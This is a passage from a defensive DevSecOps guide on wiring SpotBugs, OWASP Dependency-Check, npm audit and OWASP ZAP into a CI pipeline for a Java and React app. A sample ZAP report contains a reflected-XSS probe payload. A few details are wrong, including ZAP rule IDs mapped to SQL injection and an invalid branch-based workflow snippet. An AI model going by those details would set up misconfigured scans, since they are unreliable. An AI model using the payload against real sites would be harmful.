- name: Start Application
  run: |
    cd sample_app_java/backend
    mvn spring-boot:run &
    sleep 30
    curl http://localhost:8080/actuator/health

- name: Run OWASP ZAP Baseline Scan
  uses: zaproxy/action-baseline@v0.12.0
  with:
    docker: 'ghcr.io/zaproxy/zaproxy:stable'
    target: 'http://localhost:8080'
    rules_file_name: '.zap/rules.tsv'
    cmd_options: '-a -j'
    fail_action: true

- name: Upload ZAP Report
  uses: actions/upload-artifact@v4
  if: always()
  with:
    name: zap-report
    path: |
      report_html.html
      report_json.json
```

#### Custom Rules File

**`.zap/rules.tsv`:**
```
# Rule ID    WARN/FAIL/IGNORE    Notes
10010       WARN                SQL Injection - warn only in dev
40012       FAIL                Cross Site Scripting (Reflected)
10021       WARN                X-Content-Type-Options header missing
10020       FAIL                X-Frame-Options header not set
10054       FAIL                Cookie without Secure flag
10055       FAIL                CSP not set
```

#### Output Format

**JSON Report Structure:**
```json
{
  "@generated": "2025-11-06T14:30:00",
  "@version": "2.14.0",
  "site": [
    {
      "@name": "http://localhost:8080",
      "@host": "localhost",
      "@port": "8080",
      "alerts": [
        {
          "pluginid": "40012",
          "alertRef": "40012",
          "alert": "Cross-Site Scripting (Reflected)",
          "name": "Cross-Site Scripting (Reflected)",
          "riskcode": "3",
          "confidence": "2",
          "riskdesc": "High (Medium)",
          "desc": "Cross-site Scripting (XSS) is an attack...",
          "instances": [
            {
              "uri": "http://localhost:8080/search",
              "method": "GET",
              "param": "q",
              "attack": "<script>alert(1)</script>",
              "evidence": "<script>alert(1)</script>"
            }
          ],
          "solution": "Phase: Architecture and Design...",
          "reference": "https://owasp.org/www-community/attacks/xss/",
          "cweid": "79",
          "wascid": "8",
          "sourceid": "3"
        }
      ]
    }
  ]
}
```

#### Performance Tuning

```bash
# Increase scan speed (less thorough)
zap-baseline.py -t http://localhost:8080 -l PASS

# Limit to specific attack types
zap-baseline.py -t http://localhost:8080 -c zap-rules.conf

# Parallel scanning
zap-baseline.py -t http://localhost:8080 --hook=/zap/hook.py

# Exclude certain URLs
zap-baseline.py -t http://localhost:8080 -x ".*logout.*"
```

**Scan Time Estimates:**

| Application Size | Baseline Scan | Full Scan |
|------------------|---------------|-----------|
| Small (< 20 pages) | 1-2 minutes | 10-15 minutes |
| Medium (20-100 pages) | 3-5 minutes | 20-40 minutes |
| Large (> 100 pages) | 10-15 minutes | 1-2 hours |

---

## Tool Comparison Matrix

| Feature | SpotBugs | OWASP Dep-Check | npm audit | OWASP ZAP |
|---------|----------|-----------------|-----------|-----------|
| **Type** | SAST | SCA | SCA | DAST |
| **Language** | Java | Java, JavaScript | JavaScript | Web (Any) |
| **Analysis** | Bytecode | Dependencies | Dependencies | Runtime |
| **Speed** | Fast (1-3 min) | Slow first run (30-60 min) | Fast (10-30 sec) | Medium (3-10 min) |
| **False Positives** | Low-Medium | Low | Low | Medium-High |
| **Requires Running App** | ❌ No | ❌ No | ❌ No | ✅ Yes |
| **CI/CD Friendly** | ✅ Excellent | ⚠️ Good (cache needed) | ✅ Excellent | ⚠️ Good (needs setup) |
| **Auto-Fix** | ❌ No | ❌ No | ✅ Yes (`npm audit fix`) | ❌ No |
| **Database** | Built-in patterns | NVD (200K+ CVEs) | GitHub Advisory | OWASP rules |
| **Coverage** | Code quality + Security | Known CVEs only | Known CVEs only | OWASP Top 10 |
| **Best For** | Development phase | Release validation | Continuous monitoring | Pre-production testing |

---

## Integration in CI/CD Pipeline

### GitHub Actions Complete Workflow

```yaml
name: DevSecOps Security Pipeline

on:
  push:
    branches: [ main ]
  pull_request:
    branches: [ main ]
  workflow_dispatch:

jobs:
  # Job 1: SAST - Java Static Analysis
  sast-java:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      
      - name: Set up JDK 11
        uses: actions/setup-java@v3
        with:
          java-version: '11'
          distribution: 'temurin'
          cache: maven
      
      - name: Compile Java Code
        run: |
          cd sample_app_java/backend
          mvn clean compile
      
      - name: Run SpotBugs Security Analysis
        run: |
          cd sample_app_java/backend
          mvn spotbugs:check -Dspotbugs.effort=Max -Dspotbugs.threshold=Low
      
      - name: Upload SpotBugs Report
        uses: actions/upload-artifact@v4
        if: always()
        with:
          name: spotbugs-report
          path: sample_app_java/backend/target/spotbugs/*.xml

  # Job 2: SCA - Dependency Scanning
  sca:
    runs-on: ubuntu-latest
    needs: sast-java
    steps:
      - uses: actions/checkout@v4
      
      - name: Set up JDK 11
        uses: actions/setup-java@v3
        with:
          java-version: '11'
          distribution: 'temurin'
      
      - name: Set up Node 14
        uses: actions/setup-node@v3
        with:
          node-version: '14'
      
      # Java Dependency Check
      - name: Cache OWASP Dependency-Check Data
        uses: actions/cache@v3
        with:
          path: ~/.m2/repository/org/owasp/dependency-check-data
          key: dependency-check-data-${{ hashFiles('**/pom.xml') }}
      
      - name: Run OWASP Dependency-Check (Java)
        run: |
          cd sample_app_java/backend
          mvn org.owasp:dependency-check-maven:check \
            -DfailBuildOnCVSS=7 \
            -DnvdApiKey=${{ secrets.NVD_API_KEY }}
      
      # JavaScript Dependency Check
      - name: Run npm audit (React)
        run: |
          cd sample_app_java/frontend
          npm install
          npm audit --audit-level=moderate
      
      - name: Upload SCA Reports
        uses: actions/upload-artifact@v4
        if: always()
        with:
          name: sca-reports
          path: |
            sample_app_java/backend/target/dependency-check-report.html
            sample_app_java/frontend/npm-audit.json

  # Job 3: Build Application
  build:
    runs-on: ubuntu-latest
    needs: [sast-java, sca]
    steps:
      - uses: actions/checkout@v4
      
      - name: Build Java Backend
        run: |
          cd sample_app_java/backend
          mvn clean package -DskipTests
      
      - name: Build React Frontend
        run: |
          cd sample_app_java/frontend
          npm install
          CI=false npm run build
      
      - name: Upload Build Artifacts
        uses: actions/upload-artifact@v4
        with:
          name: build-artifacts
          path: |
            sample_app_java/backend/target/*.jar
            sample_app_java/frontend/build/

  # Job 4: DAST - Dynamic Testing
  dast:
    runs-on: ubuntu-latest
    needs: build
    steps:
      - uses: actions/checkout@v4
      
      - name: Download Build Artifacts
        uses: actions/download-artifact@v4
        with:
          name: build-artifacts
      
      - name: Start Spring Boot Application
        run: |
          cd sample_app_java/backend
          java -jar target/*.jar &
          sleep 30
          curl http://localhost:8080/actuator/health
      
      - name: Run OWASP ZAP Scan
        uses: zaproxy/action-baseline@v0.12.0
        with:
          docker: 'ghcr.io/zaproxy/zaproxy:stable'
          target: 'http://localhost:8080'
          rules_file_name: '.zap/rules.tsv'
          cmd_options: '-a -j'
      
      - name: Upload DAST Reports
        uses: actions/upload-artifact@v4
        if: always()
        with:
          name: dast-reports
          path: |
            report_html.html
            report_json.json

  # Job 5: Security Gate
  security-gate:
    runs-on: ubuntu-latest
    needs: [sast-java, sca, dast]
    steps:
      - name: Download All Reports
        uses: actions/download-artifact@v4
      
      - name: Evaluate Security Posture
        run: |
          echo "Checking for CRITICAL/HIGH vulnerabilities..."
          
          # Check SpotBugs (fail on any HIGH priority bugs)
          spotbugs_high=$(grep -c 'priority="1"' spotbugs-report/*.xml || echo 0)
          echo "SpotBugs HIGH: $spotbugs_high"
          
          # Check Dependency-Check (fail on CVSS >= 7.0)
          dep_critical=$(grep -c '"severity":"CRITICAL"' sca-reports/*.json || echo 0)
          dep_high=$(grep -c '"severity":"HIGH"' sca-reports/*.json || echo 0)
          echo "Dependency-Check CRITICAL: $dep_critical, HIGH: $dep_high"
          
          # Check OWASP ZAP (fail on any HIGH risk)
          zap_high=$(grep -c '"riskcode":"3"' dast-reports/report_json.json || echo 0)
          echo "OWASP ZAP HIGH: $zap_high"
          
          # Decision logic
          total_critical=$((spotbugs_high + dep_critical + dep_high + zap_high))
          
          if [ $total_critical -gt 0 ]; then
            echo "❌ SECURITY GATE FAILED: $total_critical critical/high issues found"
            exit 1
          else
            echo "✅ SECURITY GATE PASSED: No critical issues"
          fi
```

---

## Best Practices

### 1. Development Phase

```bash
# Run SpotBugs before committing
mvn spotbugs:check

# Check dependencies weekly
mvn org.owasp:dependency-check-maven:check
npm audit

# Use pre-commit hooks
cat > .git/hooks/pre-commit << 'EOF'
#!/bin/bash
mvn spotbugs:check || exit 1
npm audit --audit-level=high || exit 1
EOF
chmod +x .git/hooks/pre-commit
```

### 2. CI/CD Integration

**Fail Fast Strategy:**
```yaml
# Stop pipeline on CRITICAL/HIGH findings
- name: Security Gate
  run: |
    if grep -q 'CRITICAL\|HIGH' reports/*.json; then
      echo "Security vulnerabilities found!"
      exit 1
    fi
```

**Progressive Scanning:**
```yaml
# Different scans for different branches
on:
  push:
    branches:
      - main: full-scan
      - develop: baseline-scan
      - feature/*: quick-scan
```

### 3. Remediation Priorities

| Priority | Severity | Timeline | Action |
|----------|----------|----------|--------|
| **P0** | CRITICAL (CVSS 9.0-10.0) | 24 hours | Emergency patch |
| **P1** | HIGH (CVSS 7.0-8.9) | 7 days | Sprint planning |
| **P2** | MEDIUM (CVSS 4.0-6.9) | 30 days | Backlog item |
| **P3** | LOW (CVSS 0.1-3.9) | 90 days | Technical debt |

### 4. False Positive Management

**SpotBugs Suppression:**
```java
@SuppressFBWarnings(
    value = "SQL_NONCONSTANT_STRING_PASSED_TO_EXECUTE",
    justification = "Query is parameterized via JPA"
)
public List<User> findUsers(String name) {
    return entityManager
        .createQuery("SELECT u FROM User u WHERE u.name = :name")
        .setParameter("name", name)
        .getResultList();
}
```

**Dependency-Check Suppression:**
```xml
<!-- dependency-check-suppressions.xml -->
<suppressions>
    <suppress>
        <cve>CVE-2021-12345</cve>
        <reason>False positive - not applicable to our use case</reason>
    </suppress>
</suppressions>
```

### 5. Continuous Monitoring

```bash
# Schedule daily dependency checks
0 0 * * * cd /project && mvn dependency-check:check

# Monitor security advisories
npm install -g npm-check-updates
ncu -u  # Update package.json with latest versions
```

---

## Troubleshooting

### SpotBugs Issues

**Problem:** Out of Memory Error
```
Java heap space error during SpotBugs analysis
```

**Solution:**
```bash
export MAVEN_OPTS="-Xmx2g"
mvn spotbugs:check
```

**Problem:** False Positives
```
SpotBugs reports issues in generated code
```

**Solution:**
```xml
<!-- spotbugs-exclude.xml -->
<FindBugsFilter>
    <Match>
        <Class name="~.*\.generated\..*"/>
    </Match>
</FindBugsFilter>
```

### OWASP Dependency-Check Issues

**Problem:** Slow First Run
```
dependency-check downloading NVD database (30+ minutes)
```

**Solution:**
```bash
# Get free NVD API key from https://nvd.nist.gov/developers/request-an-api-key
mvn dependency-check:check -DnvdApiKey=YOUR_KEY

# Or cache in CI/CD
- uses: actions/cache@v3
  with:
    path: ~/.m2/repository/org/owasp/dependency-check-data
    key: dependency-check-${{ hashFiles('**/pom.xml') }}
```

**Problem:** Too Many False Positives
```
dependency-check reporting vulnerabilities in test dependencies
```

**Solution:**
```xml
<configuration>
    <skipTestScope>true</skipTestScope>
    <suppressionFile>suppressions.xml</suppressionFile>
</configuration>
```

### npm audit Issues

**Problem:** Vulnerabilities in Transitive Dependencies
```
minimist vulnerability in react-scripts dependency
```

**Solution:**
```bash
# Try automatic fix
npm audit fix

# Force update (may break)
npm audit fix --force

# Use overrides (npm 8.3+)
# package.json
{
  "overrides": {
    "minimist": "^1.2.6"
  }
}
```

**Problem:** No Fix Available
```
6 vulnerabilities (1 moderate, 5 high) - no fix available
```

**Solution:**
```bash
# Check if dependency is actually used
npm ls minimist

# If not used in production, ignore
npm audit --production

# Document acceptance of risk
echo "Accepted: minimist@0.0.8 - not used in production" >> security-exceptions.txt
```

### OWASP ZAP Issues

**Problem:** Application Not Ready
```
ZAP scan fails - connection refused
```

**Solution:**
```bash
# Add health check wait
until curl -s http://localhost:8080/actuator/health; do
  echo "Waiting for app..."
  sleep 5
done
sleep 10  # Extra buffer
zap-baseline.py -t http://localhost:8080
```

**Problem:** Too Many Alerts
```
ZAP reports 500+ findings
```

**Solution:**
```bash
# Use rules file to focus on HIGH/CRITICAL
# .zap/rules.tsv
40012  FAIL   # XSS
40014  FAIL   # SQL Injection
10021  WARN   # X-Content-Type-Options
10020  WARN   # X-Frame-Options

# Run with context
zap-baseline.py -t http://localhost:8080 -c rules.tsv
```

---

## Conclusion

This document covers the essential security scanning tools for **Java Spring Boot** and **React** applications:

✅ **SpotBugs** - Static analysis for Java bytecode vulnerabilities  
✅ **OWASP Dependency-Check** - CVE scanning for Java and JavaScript dependencies  
✅ **npm audit** - JavaScript package vulnerability checking  
✅ **OWASP ZAP** - Dynamic web application security testing  

**Together, these tools provide:**
- **Complete Coverage:** SAST + SCA + DAST = Full security lifecycle
- **Early Detection:** Find vulnerabilities before production
- **Compliance:** Align with OWASP Top 10, CWE, NIST frameworks
- **Automation:** CI/CD integration for continuous security

**Next Steps:**
1. Integrate all tools into your CI/CD pipeline
2. Set up automated security gates (fail on HIGH/CRITICAL)
3. Establish remediation SLAs (24h for CRITICAL, 7d for HIGH)
4. Monitor security advisories and update dependencies regularly
5. Train development team on secure coding practices

---

**Document Maintained By:** DevSecOps AI Team  
**Last Review Date:** November 6, 2025  
**Next Review Date:** February 6, 2026  
**Feedback:** security@devsecopsai.example.com
